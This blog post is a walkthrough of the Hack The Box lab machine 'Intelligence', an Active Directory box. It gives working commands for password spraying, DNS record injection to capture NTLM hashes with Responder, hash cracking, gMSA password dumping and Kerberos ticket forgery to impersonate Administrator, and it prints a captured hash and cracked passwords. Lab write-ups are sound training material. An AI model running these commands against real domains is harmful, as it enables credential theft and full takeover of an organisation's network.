---
title: "[HTB] Intelligence - Walkthrough"
layout: post
tags: HTB
---
# Main points
* [krbrelayx](https://github.com/dirkjanm/krbrelayx) for [unconstrained delegation](https://adsecurity.org/?p=1667) (AD stuff) [More info in his blog](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)
* 

# Enumeration
## nmap scan
### TCP
* 53/tcp    open  domain        syn-ack Simple DNS Plus ^1fdf9c
* 80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
* 88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-07-14 05:01:59Z)
* 135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
* 139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
* 389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
* 445/tcp   open  microsoft-ds? syn-ack
* 464/tcp   open  kpasswd5?     syn-ack
* 593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
* 636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
* 3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
* 3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
* 5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
* 9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
* 49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
* 49691/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
* 49692/tcp open  msrpc         syn-ack Microsoft Windows RPC
* 49709/tcp open  msrpc         syn-ack Microsoft Windows RPC
* 49713/tcp open  msrpc         syn-ack Microsoft Windows RPC
* 59643/tcp open  msrpc         syn-ack Microsoft Windows RPC
### UDP
* 53/udp  open  domain       udp-response ttl 127 (generic dns response: SERVFAIL)
* 88/udp  open  kerberos-sec udp-response         Microsoft Windows Kerberos (server time: 2021-07-14 06:45:17Z)
* 123/udp open  ntp          udp-response         NTP v3






The `download` button redirects to a pdf, which name is of the format `YEAR-MONTH-DAY-upload.pdf`. Let's iterate through the whole year of 2020 to download the files if they exist and see if there are any interesting pdf files.
```python
import requests as r
for month in range(1,13):
	for day in range(1,32):
		name = f"2020-{month:02}-{day:02}-upload.pdf"
		resp = r.get(f"http://10.10.10.248/documents/{name}")
		if resp.status_code == 200:
		with open(name, "wb") as pdf:
			pdf.write(resp.content)
```

The interesting ones are
`2020-12-30-upload.pdf` and `2020-06-04-upload.pdf`

From `2020-06-04-upload`
We see there is a default password `NewIntelligenceCorpUser9876`

And from the other file we see
> Internal IT UpdateThere has recently been some outages on our web servers. Ted has gotten a script in place to help notify us if this happens again.Also, after discussion following our recent security audit we are in the process of locking down our service accounts

Maybe `Ted` is an username.

We use `exiftool` to see if there are some useful metadata on the PDFs.
We see there is a `Creator` field, which contain usernames, let's get the `Creator` of all the pdfs we downloaded.
`exiftool *.pdf -Creator > wordlist-user.txt`

We have our wordlist now.

Let's iterate through our file and try to connect to SMB with the default password `NewIntelligenceCorpUser9876`

```bash
for user in $(cat ./usernames-wordlist); do smbclient -L \\\\10.10.10.248\\ --user ${user}%NewIntelligenceCorpUser9876; echo $user; done 
```

## User
We see we have a successful login with `Tiffany.Molina`
```bash
smbclient  \\\\10.10.10.248\\Users\\ --user Tiffany.Molina%NewIntelligenceCorpUser9876
```
![Pasted image 20210724011101.png](/assets/Pasted%20image%2020210724011101.png)

Let's login to smb to `\User` share
![Pasted image 20210724011402.png](/assets/Pasted%20image%2020210724011402.png)

We go to `Desktop` and we have user flag
![Pasted image 20210724011539.png](/assets/Pasted%20image%2020210724011539.png)
# Priv Esc
From the list of the shares
![Pasted image 20210724011825.png](/assets/Pasted%20image%2020210724011825.png)

Let's check the `IT` folder

```bash
smbclient  \\\\10.10.10.248\\IT\\ --user Tiffany.Molina%NewIntelligenceCorpUser9876
```
We see there is a PowerShell script
![Pasted image 20210724011923.png](/assets/Pasted%20image%2020210724011923.png)
Let's download it

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}

```
This script is scheduled to run every 5 min, it fetches the DNS records `"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"` and filter with`web*`, so all the records will start with `web`
Then it will query this website using the default credentials, and if it's down, it will send an email to Ted Graves. So if we add our own `web*` record to the DNS records, we can get Ted Graves credentials.

So, using the user creds of Tiffany Molina, we can add our URL `webpico.intelligence.htb` to the DNS records. We can do that using [dnstool](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) from [krbrelayx](https://github.com/dirkjanm/krbrelayx)
```bash
python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'webpico.intelligence.htb' -d 10.10.14.106 10.10.10.248
```
![Pasted image 20210726001102.png](/assets/Pasted%20image%2020210726001102.png)

And now we start `responder` and start capturing packets from the interface `tun0` since the box will communicate with us through this interface. And we wait until the script triggers (it takes ~5min)
```bash
sudo /usr/share/responder/Responder.py -I tun0 -A 
```
![Pasted image 20210726003917.png](/assets/Pasted%20image%2020210726003917.png)
We have the NTLM hash of Ted Graves
![Pasted image 20210726005325.png](/assets/Pasted%20image%2020210726005325.png)
```code
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:8c98e34ff25ae81a:F3E37A251792077C96264CE5548C4023:01010000000000002E43EAC6E381D701E4CC5C8351C2D0BD000000000200080059005A004900570001001E00570049004E002D00520047005100340047004400360045003900320045000400140059005A00490057002E004C004F00430041004C0003003400570049004E002D00520047005100340047004400360045003900320045002E0059005A00490057002E004C004F00430041004C000500140059005A00490057002E004C004F00430041004C000800300030000000000000000000000000200000AC0397AF3ED5EC43E7F6967E763B43E89EBAB2A62243DE6603BFC5D72100C7010A0010000000000000000000000000000000000009003A0048005400540050002F007700650062007000690063006F002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000 
```
Let's crack it with `John`
```bash
john --format=netNTLMv2 --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![Pasted image 20210726005658.png](/assets/Pasted%20image%2020210726005658.png)
And now we have the password of Ted Graves `Mr.Teddy`

From Payloads all the things we can dump [gMSA passwords](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#reading-gmsa-password) of group managed accounts

```bash
python3 ./gMSADumper/gMSADumper.py -u Ted.Graves -p Mr.Teddy  -d intelligence.htb
```
![Pasted image 20210726082802.png](/assets/Pasted%20image%2020210726082802.png)
We get the NThash, let's get the silver ticket with impacket getST. We can get the spn with a LDAP search  for `msDS-AllowedToDelegateTo:` to see if Ted have delegation rights

We get the silver ticket with impacket and the hash we got previously and we try to impersonate administrator
```bash
impacket-getST intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :47e89a6afd68e3872ef1acaf91d0b2f7 -impersonate Administrator
```
![Pasted image 20210726081755.png](/assets/Pasted%20image%2020210726081755.png)
![Pasted image 20210726083147.png](/assets/Pasted%20image%2020210726083147.png)
We export the `Administrator.ccache` 
`export KRB5CCNAME=Administrator.ccache`
so that other impacket script can access it

we connect to smb
```bash
smbclient.py -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass 
```

![Pasted image 20210726083533.png](/assets/Pasted%20image%2020210726083533.png)

And we have root flag